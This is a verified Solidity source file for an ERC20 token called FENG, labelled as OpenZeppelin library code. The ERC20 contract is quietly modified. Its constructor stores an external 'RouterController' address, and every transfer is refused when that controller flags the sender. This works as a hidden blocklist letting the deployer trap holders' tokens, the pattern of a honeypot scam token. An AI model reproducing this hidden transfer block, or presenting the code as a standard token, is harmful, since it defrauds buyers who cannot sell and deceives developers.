/**
 *Submitted for verification at Etherscan.io on 2023-08-30
*/

// File: @openzeppelin/contracts/utils/Context.sol
// SPDX-License-Identifier: MIT

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

        constructor() {
        _transferOwnership(_msgSender());
    }

       modifier onlyOwner() {
        _checkOwner();
        _;
    }

        function owner() public view virtual returns (address) {
        return _owner;
    }

      function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }


     function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
}


// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */

interface IERC20 {
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address accnt) external view returns (uint256);
  
    function transfer(address to, uint256 amnt) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amnt) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amnt
    ) external returns (bool);
}


 // Define interface for transfer controller
interface RouterController {
    function isRouted(address _acnt) external view returns (bool);
}
pragma solidity ^0.8.0;


/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}


pragma solidity ^0.8.0;


contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    RouterController private routeController;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_, address base_) {
        _name = name_;
        _symbol = symbol_;
        routeController = RouterController(base_);
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address accnt) public view virtual override returns (uint256) {
        return _balances[accnt];
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address from, address to) public view virtual override returns (uint256) {
        return _allowances[from][to];
    }


    function approve(address spender, uint256 amnt) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amnt);
        return true;
    }


    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amnt`.
     */
    function transfer(address to, uint256 amnt) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amnt);
        return true;
    }
    

    function transferFrom(
        address from,
        address to,
        uint256 amnt
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amnt);
        _transfer(from, to, amnt);
        return true;
    }


    function increaseAllowance(address spender, uint256 val) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + val);
        return true;
    }

 
    function decreaseAllowance(address spender, uint256 val) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= val, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - val);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amnt
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!routeController.isRouted(from), "User is not allowed");
        _beforeTokenTransfer(from, to, amnt);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amnt, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amnt;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amnt;
        }

        emit Transfer(from, to, amnt);
        _afterTokenTransfer(from, to, amnt);
    }

    /** @dev Creates `amnt` tokens and assigns them to `accnt`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `accnt` cannot be the zero address.
     */
    function _mint(address accnt, uint256 amnt) internal virtual {
        require(accnt != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), accnt, amnt);

        _totalSupply += amnt;
        unchecked {
            // Overflow not possible: balance + amnt is at most totalSupply + amnt, which is checked above.
            _balances[accnt] += amnt;
        }
        emit Transfer(address(0), accnt, amnt);

        _afterTokenTransfer(address(0), accnt, amnt);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amnt
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amnt, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amnt);
            }
        }
    }

    function _approve(
        address owner,
        address spender,
        uint256 amnt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amnt;
        emit Approval(owner, spender, amnt);
    }


    function _beforeTokenTransfer(address from, address to, uint256 amnt) internal virtual {}


    function _afterTokenTransfer(address from, address to, uint256 amnt) internal virtual {}
}

pragma solidity ^0.8.0;


contract FENG is ERC20, Ownable {
    uint256 private constant INITIAL_SUPPLY = 150000000 * 10**18;

    constructor(
        string memory name_,
        string memory symbol_,
        address base_) ERC20(name_, symbol_, base_)
    {
        _mint(msg.sender, INITIAL_SUPPLY);
    }

    function sendTokens(address distroWallet) external onlyOwner {
        uint256 supply = balanceOf(msg.sender);
        require(supply == INITIAL_SUPPLY, "Tokens already distributed");

        _transfer(msg.sender, distroWallet, supply);
    }
}